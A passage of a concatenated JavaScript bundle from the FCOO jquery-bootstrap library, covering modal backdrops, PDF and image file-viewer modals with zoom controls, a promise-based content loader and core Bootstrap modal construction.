                    .addClass('global-backdrop')
                    .toggleClass('transparent', !!transparent)
                    .appendTo( $('body') );

        $modalBD
            ._setModalBackdropZIndex( -1 )
            .removeClass('hidden')
            .addClass('show');

        return $modalBD;
    }

    $._addModalBackdropLevel = function(transparent){
        if (transparent)
            $modalBackdrop_current = $modalTransparentBackdrop = addAnyModalBackdropLevel($modalTransparentBackdrop, true);
        else
            $modalBackdrop_current = $modalBackdrop = addAnyModalBackdropLevel($modalBackdrop);
    };

    /******************************************************
    $._removeModalBackdropLevel
    Move the backdrop down in z-index
    ******************************************************/
    $._removeModalBackdropLevel = function( noDelay ){
        var isTransparentBD = ($modalBackdrop_current === $modalTransparentBackdrop);

        modalBackdropLevels--;

        $modalBackdrop_current._setModalBackdropZIndex( -1 );
        if (!modalBackdropLevels || isTransparentBD){
            $modalBackdrop_current
                .removeClass('show');
            if (noDelay || isTransparentBD)
                $modalBackdrop_current.addClass('hidden');
            else
                window.setTimeout( function(){ $modalBackdrop_current.addClass('hidden'); }, 2000 );
        }

        if ($modalBackdrop_current === $modalTransparentBackdrop)
            $modalBackdrop_current = $modalBackdrop;

    };


    /******************************************************
    $.workingOn / $.workingOff
    Display/hide a bagdrop while some process is 'working'
    ******************************************************/
    $.workingOn = function(){
        $._addModalBackdropLevel();
        window.setTimeout(function(){
            $modalBackdrop.addClass('working');
        }, 100);
    };
    $.workingOff = function(){
        $._removeModalBackdropLevel(true);
        window.setTimeout(function(){
            $modalBackdrop.removeClass('working');
        }, 100);

    };


}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-modal-file.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, i18next,  window /*, document, undefined*/) {
	"use strict";


    var objectWithFileClasses = 'border-0 w-100 h-100';

    //$.bsHeaderIcons = class-names for the different icons on the header
    $.bsExternalLinkIcon = 'fa-external-link-alt';

    /**********************************************************
    modalFileLink( fileName, bsModalOptions )
    Return a link to bsModalFile
    **********************************************************/
    $.modalFileLink = function( fileName, bsModalOptions ){
        fileName = $._bsAdjustText(fileName);
        return window.PDFObject.supportsPDFs ?
            function(){ return $.bsModalFile( fileName, bsModalOptions ); } :
            fileName;
    };


    /**********************************************************
    updateImgZoom( $im)
    **********************************************************/
    var ZoomControl = function( $img ){
        this.$img = $img;
        this.zooms = [25, 33, 50, 67, 75, 80, 90, 100, 110, 125, 150, 175, 200, 250, 300, 400, 500];
        this.zoomIndex = this.zooms.indexOf(100);
    };

    ZoomControl.prototype = {
        getButtons: function(){
            var _this = this;
            this.$zoomOutButton = $.bsButton({type:'button', icon:'fa-search-minus',  text:{da:'Zoom ud',  en:'Zoom Out'}, onClick: _this.zoomOut, context: _this });
            this.$zoomInButton  = $.bsButton({type:'button', icon:'fa-search-plus',   text:{da:'Zoom ind', en:'Zoom In'},  onClick: _this.zoomIn,  context: _this });

            return [this.$zoomOutButton, this.$zoomInButton];
        },

        zoomIn : function(){ this.update(false); },
        zoomOut: function(){ this.update(true);  },

        mousewheel: function( event ){
            var delta =
                    event.deltaX ? event.deltaX :
                    event.deltaY ? event.deltaY :
                    0;
            if (delta)
                this.update( delta < 0 );
            event.stopPropagation();
            event.preventDefault();
        },

        update: function(zoomOut){
            this.zoomIndex = this.zoomIndex + (zoomOut ? -1 : + 1);
            this.zoomIndex = Math.max( 0, Math.min( this.zoomIndex, this.zooms.length-1) );

            this.$img.css('width', this.zooms[this.zoomIndex]+'%');
            var isMin = this.zoomIndex == 0;
            var isMax = this.zoomIndex == this.zooms.length-1;

            this.$zoomOutButton.attr('disabled', isMin).toggleClass('disabled', isMin);
            this.$zoomInButton.attr('disabled', isMax).toggleClass('disabled', isMax);
         }
    };


    /**********************************************************
    bsModalFile( fileName, options )
    **********************************************************/
    $.bsModalFile = function( fileName, options = {} ){
        fileName = $._bsAdjustText(fileName);
        var theFileName = i18next.sentence(fileName),
            fileNameExt = window.url('fileext', theFileName),
            $content,
            footer = {
                da: 'Hvis filen ikke kan vises, klik på <i class="' +           $.FONTAWESOME_PREFIX + ' ' + $.bsExternalLinkIcon + '"></i> for at se dokumentet i en ny fane',
                en: 'If the file doesn\'t show correctly click on <i class="' + $.FONTAWESOME_PREFIX + ' ' + $.bsExternalLinkIcon + '"></i> to see the document in a new Tab Page'
            },
            fullWidth       = true,
            noPadding       = true,
            scroll          = false,
            alwaysMaxHeight = true;

        fileNameExt = fileNameExt ? fileNameExt.toLowerCase() : 'unknown';

        //Check for ext == 'pdf' and support for pdf
        if ((fileNameExt == 'pdf') && !window.PDFObject.supportsPDFs){
            $content =
                $('<div/>')
                    .addClass('text-center')
                    ._bsAddHtml({text: {
                        da: 'Denne browser understøtter ikke visning<br>af pdf-filer i popup-vinduer<br>Klik på <i class="' + $.FONTAWESOME_PREFIX + ' ' + $.bsExternalLinkIcon + '"/> for at se dokumentet i en ny fane',
                        en: 'This browser does not support<br>pdf-files in popup windows<br>Click on <i class="' +            $.FONTAWESOME_PREFIX + ' ' + $.bsExternalLinkIcon + '"/> to see the document<br>in a new Tab page'
                    }});
            fullWidth       = false;
            footer          = null;
            noPadding       = false;
            alwaysMaxHeight = false;

        }
        else {
            switch (fileNameExt){
                //*********************************************
                case 'pdf':
                    //passes a jQuery object (HTML node) for target
                    $content = $('<div/>').addClass(objectWithFileClasses);
                    window.PDFObject.embed(
                        theFileName,
                        $content,
                        { pdfOpenParams: { view: 'FitH' } }
                    );
                    break;

                //*********************************************
                case 'jpg':
                case 'jpeg':
                case 'gif':
                case 'png':
                case 'tiff':
                case 'bmp':
                case 'ico':
                    var $iframe =
                            $('<iframe></iframe>')
                                .addClass(objectWithFileClasses),
                        $img =
                            $('<img src="' + theFileName + '"/>')
                                .css('width', '100%');

                    //Create a ZoomControl to zoom in and out
                    var zoomControl = new ZoomControl( $img );

                    //Add the images to the iframe when the iframe is loaded into the DOM
                    setTimeout( function(){
                        var contents = $iframe.contents(),
                            $iframeBody = contents.find('body')/*,
                            $iframeHead = contents.find('head')*/;

                        $iframeBody.on('mousewheel', $.proxy( zoomControl.mousewheel, zoomControl ) );
                        $iframeBody.append($img);

                        /* Try to adjust style of iframe - Not working
                        var style = document.createElement('style');
                        style.type = 'text/css';
                        style.innerHTML =
                            'body { scrollbar-width: thin; scrollbar-color: #cdcdcd white;; }; ' +
                            'html ::-webkit-scrollbar-thumb {background-color: #cdcdcd; border-radius: 6px; border: 1px solid white; box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.5); }';
                        $iframeHead.append(style);

                        //Or by css-file
                        var cssLink = document.createElement("link");
                        cssLink.href = "style.css";
                        cssLink.rel = "stylesheet";
                        cssLink.type = "text/css";
                        $iframeHead.append(cssLink);
                        */
                    }, 200);

                    $content = [
                        $iframe,
                        $('<div></div>')
                            .addClass('modal-footer')
                            .css('justify-content',  'center')
                            ._bsAppendContent( zoomControl.getButtons() )
                    ];

                    scroll = false;
                    break;

                //*********************************************
                case 'html':
                case 'unknown':
                    $content = $('<iframe src="' + theFileName + '"/>').addClass(objectWithFileClasses);
                    break;

                //*********************************************
                default:
                    //Try default <object> to display the file
                    $content = $('<object data="' + theFileName + '"/>').addClass(objectWithFileClasses);

            } //end of switch (fileNameExt){...
        }

        //Create the bsModal
        return $.bsModal({
                    header    : options.header,
                    scroll    : scroll,
                    flexWidth : fullWidth,
                    megaWidth : fullWidth,

                    noVerticalPadding  : noPadding,
                    noHorizontalPadding: noPadding,
                    alwaysMaxHeight    : alwaysMaxHeight,
                    buttons   : [{
                        icon: $.bsExternalLinkIcon,
                        text: {da: 'Åbne', en: 'Open'},
                        link: options.externalFileName || fileName
                    }],

                    content   : $content,
                    footer    : footer,

                    remove       : options.remove,
                    removeOnClose: options.removeOnClose,
                    defaultRemove: true

               });
    };

}(jQuery, this.i18next, this, document));
;
/****************************************************************************
    jquery-bootstrap-modal-image.js

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

    $.bsModalImage = function( fileName, options = {} )
    Displays one image in a full screen modal window


****************************************************************************/

(function ($, i18next, window /*, document, undefined*/) {
	"use strict";

    var pinchZoomId = 0;

    $.bsModalImage = function( fileName, options ){
        var id = 'pinchZoom'+ pinchZoomId++,
            theFileName = i18next.sentence( $._bsAdjustText(fileName) ),

            $imgContainer = $('<div/>').addClass('zoomHolder w-100 h-100'),
            $img = $('<img id="'+id+'" src="' + theFileName + '"/>')
                    .appendTo($imgContainer),

            footer          = [],
            footerTextClass = 'd-block w-100 text-center caption';
        if (options.icon || options.text)
            footer.push(
                $('<div/>')
                    .addClass(footerTextClass)
                    ._bsAddHtml({icon: options.icon, text: options.text})
            );
        if (options.subIcon || options.subText)
            footer.push(
                $('<div/>')
                    .addClass(footerTextClass + ' font-size-0-9em')
                    ._bsAddHtml({icon: options.subIcon, text: options.subText})
            );


        //Create the bsModal
        var $result = $.bsModal({
            fullScreen: true,
            header    : options.header,
            noHeader  : !options.header,

            scroll    : false,

            noVerticalPadding  : true,
            noHorizontalPadding: true,

            buttons   : [{
                id      : 'auto-zoom',
                icon    : 'fa-expand',
                type    : 'checkboxbutton',
                square  : true,
                selected: true,
                onChange: function(id, selected){ $result.autoZoomToggle(selected); }
            },{
                id     : 'one-to-one',
                text   : '1:1',
                square : true,
                onClick: function(){ $result.originalSize(); }
            },{
                icon   : 'fa-magnifying-glass-plus',
                square : true,
                onClick: function(){ $result.pz.zoomIn(); }
            },{
                icon   : 'fa-magnifying-glass-minus',
                square : true,
                onClick: function(){ $result.pz.zoomOut(); }
            }],
            smallButtons: true,

            content    : $imgContainer,
            className:'overflow-hidden',

            footer     : footer,
            footerClass: 'flex-column',

            remove       : options.remove,
            removeOnClose: options.removeOnClose,
            defaultRemove: true
        });


        $result.extend( bsModalImage_prototype );
        $result.$img          = $img;
        $result.$imgContainer = $imgContainer;

        $img.on('load', $result.onLoad.bind($result) );

        return $result;

    };   //End of BsModalImage( fileName, options = {} ){

    /*******************************************************
    Extend the prototype of BsModalImage
    *******************************************************/

    var bsModalImage_prototype = {
        onLoad: function(){
            var $content = this.bsModal.$content,
                $img     = this.$img;

            this.viewportWidth  = $content.outerWidth();
            this.viewportHeight = $content.outerHeight();

            this.autoZoomScaleMode = 'proportionalInside';
            this.autoZoomOn = true;

            //minZoom set to ensure smallest image = 100px
            var minDim = Math.min($img.width(), $img.height()),
                minZoom = window.nearest(100/minDim, .1);

            $img.data('elem', 'pinchzoomer');
            $img.pinchzoomer({
                preloaderUrl: $img.attr('src'),
                minZoom     : minZoom,
                maxZoom     : 10,
                scaleMode   : this.autoZoomScaleMode,
                adjustHolderSize: false,
            }, false);

            this.pz = this.pinchZoomer = window.PinchZoomer.get($img.attr('id'));
            this.pinchZoomer.on(window.PinchZoomer.ZOOM, this.autoZoomOff.bind( this ) );

            //Zoom in and out using mouse-wheel plus resize
            $content
                .on('mousewheel', this._on_mousewheel.bind(this) )
                .resize( this._on_resize.bind(this) );

            //Find the auto-zoom button
            this.$autoZoomButton = this.bsModal.$buttonContainer.find('#auto-zoom');
        },

        _on_resize : function(){
            this.viewportWidth  = this.bsModal.$content.outerWidth();
            this.viewportHeight = this.bsModal.$content.outerHeight();
        },

        _on_mousewheel: function(e){
            //If mouse outside image => zoom in or out
            if (e.target === this.$img.get(0)) return;
            if (e.deltaY == 1)
                this.pz.zoomIn();
            if (e.deltaY == -1)
                this.pz.zoomOut();
        },


        originalSize: function(){
            this.autoZoomToggle(false);
            this.pz.zoom(1);
        },

        autoZoomOff: function(){
            if (!this.dontCall_autoZoomToggle)
                this.autoZoomToggle(false);
        },

        autoZoomToggle: function(on){
            if (this.autoZoomOn == on) return;

            this.autoZoomOn = on;
            this.$autoZoomButton._cbxSet(on, true);

            this.pz.vars({ scaleMode: on ? this.autoZoomScaleMode : 'none' });

            if (on){
                this.dontCall_autoZoomToggle = true;
                this.pz.zoom(1, 0);
                this.dontCall_autoZoomToggle = false;
            }
        },
    };

}(jQuery, this.i18next, this, document));
;
/****************************************************************************
jquery-bootstrap-modal-promise.js

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    /**********************************************************
    $.BsModalContentPromise
    Read data from a url and updates bsModal-content in associated "owner" of the modals.
    Is bsModal and other classes (leaflet-layer)
    Each class working as owner can have (but do not need to have) tree methods:
        _bsModalPromise_Update(options) - Called with the new options
        _bsModalPromise_Reject: Called when the reguest failed
        _bsModalPromise_SetOnChange( func ) - add event that calls func when the owner is changed and need "fresh" options

    options = {
        url             : STRING or FUNCTION
        getModalOptions : function(data): return new modal-options based on data retrieved fra url
        needToReload    : BOOLEAN or FUNCTION return true if the data nedd to reload from
    }

    Used methods:

    **********************************************************/
    $.BsModalContentPromise = function(options){
        this.options = options;
    };


	$.BsModalContentPromise.prototype = {
        _getUrl: function(){
            return $.isFunction(this.options.url) ? this.options.url() : this.options.url;
        },

        _needToUpdate: function(){
            if (!this.data) return true;
            if ($.isFunction(this.options.needToUpdate))
                return this.options.needToUpdate(this.modalOptions);
            return !!this.options.needToUpdate;
        },

        /**********************************************
        addBsModalOwner(owner) - add a object (owner) with methods for updating/reject of data.

        options
            getModalOptions(data): Convert data to options for owners modal (optional)
        **********************************************/
        addBsModalOwner: function( owner, options ){
            this.ownerList = this.ownerList || [];
            this.ownerList.push({owner: owner, options: options});

            if (owner._bsModalPromise_SetOnChange)
                owner._bsModalPromise_SetOnChange( $.proxy(this.update, this) );
        },

        resolve: function(data){
            this.loading = false;
            $.workingOff();
            this.data = data;
            this.updateOwner();
        },

        reject: function(){
            var _this = this;
            this.loading = false;
            $.workingOff();
            $.each(this.ownerList, function(index, ownerOptions){
                var owner      = ownerOptions.owner,
                    rejectFunc = owner._bsModalPromise_Reject || _this.options.reject;

                if (rejectFunc)
                    $.proxy(rejectFunc, owner)();
            });
            if (this.options.afterReject)
                this.options.afterReject();
        },

        //update() - check and load or update the content
        update: function(){
            if (this.loading) return;

            if (this._needToUpdate()){
                this.loading = true;
                $.workingOn();
                Promise.getJSON(this._getUrl(), {
                    useDefaultErrorHandler: true,
                    resolve: $.proxy(this.resolve, this),
                    reject : $.proxy(this.reject, this)
                });
            }
            else {
                this.loading = true;
                this.updateOwner();
                this.loading = false;
            }
        },

        //updateOwner - update the owners with the new content
        updateOwner: function(){
            var _this = this;
            $.each(this.ownerList, function(index, ownerOptions){
                //Convert this.data to modal-options
                var owner        = ownerOptions.owner,
                    convertFunc  = ownerOptions.getModalOptions || _this.options.getModalOptions || function(data){return data;},
                    updateFunc   = owner._bsModalPromise_Update || _this.options.update,
                    modalOptions = $.proxy(convertFunc, owner)(_this.data);

                if (updateFunc)
                    $.proxy(updateFunc, owner)(modalOptions);
            });
            if (this.options.afterUpdate)
                this.options.afterUpdate();
        }
    };

}(jQuery, this, document));

;
/****************************************************************************
	jquery-bootstrap-modal.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, bootstrap, window, document, undefined) {
	"use strict";

    //Adjusting default options jquery-scroll-container
    window.JqueryScrollContainer.scrollbarOptions.paddingLeft = true;
    window.JqueryScrollContainer.update(window.bsIsTouch);

    /**********************************************************
    bsModal( options ) - create a Bootstrap-modal

    options
        header
        modalContentClassName
        icons: {
            close   : {onClick, attr, className, attr, data }
            extend  : {onClick, attr, className, attr, data }
            diminish: {onClick, attr, className, attr, data }
}       type //"", "alert", "success", "warning", "error", "info"
        fixedContent

        //The height of the modal can be one of the following four ways:
        height   : NUMBER - The fixed height

        maxHeight: NUMBER - The max height

        relativeHeight       : NUMBER of FUNCTION. Must be/return a number <= 1 witch is the relative height compared with the parent container of the modal. Default = 1
        relativeHeightOffset : NUMBER or FUNCTION. Must be/return a number the is deducted from parent-container-height * relativeHeight. Default = 2 * modalVerticalMargin
        parentContainerHeight: NUMBER or FUNCTION. Is/return the height of the parent container. Default = window.innerHeight

        alwaysMaxHeight: BOOLEAN - If true the modal is always the full height of it parent


        flexWidth
        extraWidth
        megaWidth
        fullScreen
        noVerticalPadding
        noHorizontalPadding
        noShadow
        small: BOOLEAN if true the content gets extra small
        smallButtons: BOOLEAN If true the modal gents extra small buttons
        content
        verticalButtons: BOOLEAN, default = false, if true the buttons are vertical stacked and has width = 100%
        scroll: boolean | 'vertical' | 'horizontal'
        minimized,
        extended: {
            type
            showHeaderOnClick (only minimized)
            fixedContent
            noVerticalPadding
            noHorizontalPadding
            alwaysMaxHeight
            content
            verticalButtons: BOOLEAN, default = options.verticalButtons, if true the buttons are vertical stacked and has width = 100%. If false and options.verticalButtons = true only normal gets vertival buttons
            scroll: boolean | 'vertical' | 'horizontal'
            footer
        }
        isExtended: boolean
        footer
        buttons = [];
        closeIcon
        closeText
        noCloseIconOnHeader
        historyList         - The modal gets backward and forward icons in header to go backward and forward in the historyList. See demo and https://github.com/fcoo/history.js

    **********************************************************/
    var modalId = 0,
        openModals = 0,
        modalVerticalMargin = 10, //Top and bottom margin for modal windows

        //Const to set different size of modal-window
        MODAL_SIZE_NORMAL    = $.MODAL_SIZE_NORMAL    = 1, //'normal',
        MODAL_SIZE_MINIMIZED = $.MODAL_SIZE_MINIMIZED = 2, //'minimized',
        MODAL_SIZE_EXTENDED  = $.MODAL_SIZE_EXTENDED  = 4, //'extended';

        modalSizeName = {};
        modalSizeName[MODAL_SIZE_NORMAL   ] = 'normal';
        modalSizeName[MODAL_SIZE_MINIMIZED] = 'minimized';
        modalSizeName[MODAL_SIZE_EXTENDED ] = 'extended';

    var modalSizeClassName = {};
        modalSizeClassName[MODAL_SIZE_NORMAL]    = 'modal-normal';
        modalSizeClassName[MODAL_SIZE_MINIMIZED] = 'modal-minimized';
        modalSizeClassName[MODAL_SIZE_EXTENDED]  = 'modal-extended';




    /**********************************************************
    CHANGE MODAL OPTIONS
    In some cases an application need to adjust the default modal-options
    given by an external packages. Eg. on mobil devices - it is better to have
    modal width = max-width or full screen
    To allow this a global function and variable are defined and called/checked to
    allow modifications of the modal-options

    $.MODAL_ADJUST_OPTIONS = function(modalOptions, modal) return modal-options

    $.MODAL_NO_VERTICAL_MARGIN = false  If true all modal have vertical margin = 0

    By default it return the original options but they can be overwriten by applications/packages
    **********************************************************/
    $.MODAL_ADJUST_OPTIONS = function(modalOptions/*, modal*/){
        return modalOptions;
    };
    $.MODAL_NO_VERTICAL_MARGIN = false;

    /**********************************************************
    MAX-HEIGHT ISSUES ON SAFARI (AND OTHER BROWSER ON IOS)
    Due to an intended design in Safari it is not possible to
    use style a la max-height: calc(100vh - 20px) is not working
    as expected/needed
    Instead a resize-event is added to update the max-height of
    elements with the current value of window.innerHeight
    Sets both max-height and height to allow always-max-height options
    **********************************************************/
    function adjustModalMaxHeight( $modalContent ){
        var $modalContents = $modalContent || $('.modal-content.modal-flex-height');


        //For each $modalContent: Get the current data with options on relative size and set the height and max-height
        $modalContents.each(function(index, elem){
            var $modalContent = $(elem);
            $.each(modalSizeClassName, function(size, className){
                if ($modalContent.hasClass(className)){
                    //The current percent/offset info is in .data('relativeHeightOptions')[size];
                    var relativeOptions =
                            $.extend({
                                relativeHeight       : 1,
                                relativeHeightOffset : 2 * modalVerticalMargin,
                                parentContainerHeight: parseInt(window.innerHeight)
                            },
                                ($modalContent.data('relativeHeightOptions') || {})[size]
                            );

                    $.each(relativeOptions, function(id, value){
                        relativeOptions[id] = $.isFunction(value) ? value($modalContent) : value;
                    });

                    var maxHeight = relativeOptions.relativeHeight * relativeOptions.parentContainerHeight - relativeOptions.relativeHeightOffset;
                    $modalContent.css({
                        'max-height': maxHeight+'px',
                        'height'    : maxHeight+'px'
                    });
                }
            });
        });
    }

    window.addEventListener('resize',            function(){ adjustModalMaxHeight(); }, false );
    window.addEventListener('orientationchange', function(){ adjustModalMaxHeight(); }, false );

    /******************************************************
    The height of a modal can be tre different modes
    1: max-height is adjusted to window-height. Default
    2: max-height. options.maxHeight
    3: fixed height. options.height

    The width of a modal is by default 300px.
    options.flexWidth : If true the width of the modal will adjust to the width of the browser up to 500px
    options.extraWidth: Only when flexWidth is set: If true the width of the modal will adjust to the width of the browser up to 800px
    options.megaWidth : Only when flexWidth is set: If true the width of the modal will adjust to the width of the browser up to 1200px
    options.maxWidth  : If true the width of the modal will always be 100% minus some margin
    options.fullWidth : If true the width of the modal will always be 100%
    options.fullScreen: If true the modal will fill the hole screen without border. width = height = 100%
    options.fullScreenWithBorder: As fullScreen but with borders
    options.width     : Set if different from 300

    ******************************************************/
    function getHeightFromOptions( options ){
        if (options.height)    return {height   : options.height+'px',    maxHeight: null};
        if (options.maxHeight) return {maxHeight: options.maxHeight+'px', height   : 'auto'};
        return null;
    }

    function getWidthFromOptions( options ){
        return {
            flexWidth           : !!options.flexWidth,
            extraWidth          : !!options.extraWidth,
            megaWidth           : !!options.megaWidth,
            maxWidth            : !!options.maxWidth,
            fullWidth           : !!options.fullWidth,
            fullScreen          : !!options.fullScreen,
            fullScreenWithBorder: !!options.fullScreenWithBorder,
            width       : options.width ?
                            ( (typeof options.width == 'number') ? options.width+'px' : options.width)
                            : null
        };
    }

    /******************************************************
    $._bsModal_closeMethods = [] of {selector[STRING], method[FUNCTION($this)]}
    List of selector and method-name to be found and called to close
    elements with some sort of 'opened' part (eg. select-box)
    These elements are closed when the modal contents is scrolled and
    when the modal is closed
    ******************************************************/
    $._bsModal_closeMethods = $._bsModal_closeMethods || [];

    $.fn._bsModalCloseElements = function(){
        var _this = this;
        //'Close' alle elements (eg. select-box)
        $.each($._bsModal_closeMethods, function(index, options){
            _this.find(options.selector).each(function(){
                options.method($(this));
            });
        });
    };

    var currentModal = null;
    //******************************************************
    //show_bs_modal - called when a modal is opening
    function show_bs_modal( /*event*/ ) {
        //Close all popover
        $('.popover.show').popover('hide');


        //Close elements
        if (currentModal)
            currentModal._bsModalCloseElements();


        openModals++;
        this.previousModal = currentModal;
        currentModal = this;

        //Move up the backdrop
        $._addModalBackdropLevel(this.bsModal.transparentBackground);

        //Add layer for noty on the modal
        $._bsNotyAddLayer();

        //Move the modal to the front
        this._setModalBackdropZIndex();

        //Prevent the modal from closing with esc if there are a modal noty
        this.keydown( function( event ){
            if (window._bsNotyModal){
                window._bsNotyModal.close();
                event.stopImmediatePropagation();
                return false;
            }
        });

        if (this.onShow)
            this.onShow(this);
    }

    //******************************************************
    //shown_bs_modal - called when a modal is opened
    function shown_bs_modal( /*event*/ ) {
        //Focus on focus-element
        var $focusElement = $(this).find('.init_focus').last();
        if ($focusElement.length){
            document.activeElement.blur();
            $focusElement.focus();
        }
    }

    //******************************************************
    //hide_bs_modal - called when a modal is closing
    function hide_bs_modal() {
        currentModal = this.previousModal;

        //Close elements
        this._bsModalCloseElements();

        //Never close pinned modals
        if (this.bsModal.isPinned)
            return false;

        //Remove all noty added on the modal and move down global backdrop
        $._bsNotyRemoveLayer();

        //Remove the modal from DOM
        if (this.removeOnClose)
            this.get(0).remove();
    }

    //******************************************************
    //hidden_bs_modal - called when a modal is closed/hidden
    function hidden_bs_modal( /*event*/ ) {
        openModals--;
        if (openModals){
            //Move focus to previous modal on top
            var $modal = $('.modal.show').last(),
                $nextFocus = $modal.find('.init_focus');

            if ($nextFocus.length)
                $nextFocus.focus();
            else
                $modal.focus();

            //Re-add class "modal-open" to body (it is removed by Bootstrap)
            $('body').addClass('modal-open');
        }
    }

    function _updateFixedAndFooterInOptions( options ){
        //Adjust options if footer: true or extendedContent: true
        //If options.extended.fixedContent == true and/or options.extended.footer == true => normal and extended uses same fixed and/or footer content
        if (options.extended) {
            //If common fixed content => add it as normal fixed content
            if ((options.fixedContent === true) || (options.extended.fixedContent === true)) {
                options.fixedContent = options.fixedContent === true ? options.extended.fixedContent : options.fixedContent;
                options.extended.fixedContent = options.extended.fixedContent === true ? options.fixedContent : options.extended.fixedContent;
            }

            //If common footer content => add it as extended footer content
            if ((options.footer === true) || (options.extended.footer === true)) {
                options.footer = options.footer === true ? options.extended.footer : options.footer;
                options.extended.footer = options.extended.footer === true ? options.footer : options.extended.footer;
            }
        }
    }


    /******************************************************
    prototype for bsModal
    ******************************************************/
    var bsModal_prototype = {
        show  : function(){
                    this.modal('show');

                    this.data('bsModalDialog')._bsModalSetHeightAndWidth();

                    if (this.bsModal.onChange)
                        this.bsModal.onChange( this.bsModal );
                },

        _close: function(){
            this.modal('hide');
        },

        close: function(){
            //Close elements
            this._bsModalCloseElements();

            //If onClose exists => call and check
            if (this.onClose && !this.onClose(this))
                return false;

            //If pinable and pinned => unpin
            if (this.bsModal.isPinned)
                this._bsModalUnpin();

            this._close();
        },

        assignTo: function( $element ){
            $element.attr({
                'data-bs-toggle': 'modal',
                'data-bs-target': '#'+this.attr('id')
            });
        },

        getHeaderIcon: function(id){
            return this.find('[data-header-icon-id="'+id+'"]');
        },

        setHeaderIconEnabled: function(id, disabled){
            this.getHeaderIcon(id).toggleClass('disabled', !!disabled);
        },

        setHeaderIconDisabled: function(id){
            this.setHeaderIconEnabled(id, true);
        },


        /******************************************************
        update
        Empty and replace the content of the header, content, fixed-content, footer and
        extended-content, extended-fixed-content, extended-footer and
        minimized-content, minimized-fixed-content, minimized-footer
        Note:
        The type of content must have been difined in the original modal-options.
        Meaning that no new type can be added
        ******************************************************/
        update: function( options ){
            var _this = this;
            //***********************************************************
            function updateElement($element, newOptions, methodName, param, param2, param3 ){
                if ($element && newOptions){
                    $element.empty();
                    $element[methodName](newOptions, param, param2, param3);
                }
            }
            //***********************************************************

            //Update header
            var $iconContainer = this.bsModal.$header.find('.header-icon-container').detach();
            updateElement(this.bsModal.$header, options, '_bsHeaderAndIcons');
            this.bsModal.$header.append($iconContainer);

            _updateFixedAndFooterInOptions(options);

            //Update the tree size-contents
            $.each([null, 'minimized', 'extended'], function(index, id){
                var containers     = id ? _this.bsModal[id] : _this.bsModal,
                    contentOptions = id ? options[id]       : options;

                if (containers && contentOptions){
                    updateElement(containers.$fixedContent, contentOptions.fixedContent, '_bsAppendContent', contentOptions.fixedContentContext, contentOptions.fixedContentArg, options );
                    updateElement(containers.$content,      contentOptions.content,      '_bsAppendContent', contentOptions.contentContext,      contentOptions.contentArg,      options );
                    updateElement(containers.$footer,       contentOptions.footer,       '_bsAddHtml' );
                }
            });
            return this;
        },

        //Methods used by $.BsModalContentPromise
        _bsModalPromise_Update: function(options){
            this.update(options);
        },
        _bsModalPromise_Reject: function(){
            this.close();
        }
    };

    /******************************************************
    _bsModalBodyAndFooter
    Create the body and footer content (exc header and bottoms)
    of a modal inside this. Created elements are saved in parts
    ******************************************************/
    $.fn._bsModalBodyAndFooter = function(size, options, parts, className, initSize, parentOptions = {}){

        options = $.extend(true, {}, parentOptions, options);

        //Set variables used to set scroll-bar (if any)
        var hasScroll       = !!options.scroll,
            isTabs          = !!(options && options.content && (options.content.type == 'tabs')),
            scrollDirection = options.scroll === true ? 'vertical' : options.scroll,
            scrollbarClass  = hasScroll ? 'scrollbar-'+scrollDirection : '';

        className = (className || '') + ' show-for-modal-'+modalSizeName[size];

        //Remove padding if the content is tabs and content isn't created from bsModal - not pretty :-)
        if (isTabs){
            options.noVerticalPadding = true;
            options.noHorizontalPadding = true;
        }


        //Find the correct alert-XX class from Bootstrap
        function getAlertClass( options = {}){
            var result = options.type || '';
            switch (result){
                case 'alert'  : result = 'primary'; break;
                case 'success': result = 'success'; break;
                case 'warning': result = 'warning'; break;
                case 'error'  : result = 'danger';  break;
                case 'info'   : result = 'info';    break;
                case 'help'   : result = 'light';   break;
            }
            return result ? 'alert-'+result : '';
        }

        //Append fixed content (if any)
        //options.fixedContentOptions = options different from content for fixed-content
        var fixedOptions = $.extend({}, options, options.fixedContentOptions || {}),
            $modalFixedContent = parts.$fixedContent =
                $('<div/>')
                    .addClass('modal-body-fixed')
                    .addClass(className || '')
                    .toggleClass(scrollbarClass, !!options._fixedContentHasScrollClass )
                    .toggleClass('py-0',                        !!fixedOptions.noVerticalPadding)
                    .toggleClass('pt-0',                        !!fixedOptions.noTopPadding)
                    .toggleClass('pb-0',                        !!fixedOptions.noBottomPadding)
                    .toggleClass('px-0',                        !!fixedOptions.noHorizontalPadding)
                    .toggleClass('modal-body-semi-transparent', !!fixedOptions.semiTransparent)
                    .addClass( getAlertClass(fixedOptions) )
                    .addClass(options.fixedClassName || '')
                    .appendTo( this );

        if (options.fixedContent)
            $modalFixedContent._bsAppendContent( options.fixedContent, options.fixedContentContext, null, options );

        //Append body and content
        var $modalBody = parts.$body =
                $('<div/>')
                    .addClass('modal-body ' + className)
                    .toggleClass('modal-body-always-max-height', !!options.alwaysMaxHeight)
                    .toggleClass('py-0',                         !!options.noVerticalPadding)
                    .toggleClass('px-0',                         !!options.noHorizontalPadding)
                    .toggleClass('modal-body-semi-transparent',  !!options.semiTransparent)
                    .addClass( getAlertClass(options) )
                    .addClass(options.className || '')
                    .appendTo( this );

        if (!options.content || (options.content === {}))
            $modalBody.addClass('modal-body-no-content');


        var $modalContent = parts.$content =
                hasScroll ?
                    $modalBody
                        .addClass(scrollbarClass)
                        .addScrollbar({
                            direction       : scrollDirection,
                            contentClassName: options.noVerticalPadding ? '' : 'modal-body-with-vertical-padding' + (window.getScrollbarWidth() ? '' :' modal-body-with-horizontal-padding')
                        }) :
                    $modalBody;


        //Add content. If the content is 'dynamic' ie options.dynamic == true and options.content is a function, AND it is a different size => save function
        if (options.dynamic && (typeof options.content == 'function') && (size != initSize)){
            parts.dynamicContent        = options.content;
            parts.dynamicContentContext = options.contentContext;
            parts.dynamicContentArg     = options.contentArg;
        }
        else
            $modalContent._bsAppendContent( options.content, options.contentContext, options.contentArg, options  );

        //Add scroll-event to close any bootstrapopen -select
        if (hasScroll)
            $modalBody.on('scroll', function(){
                //Close all elements when scrolling
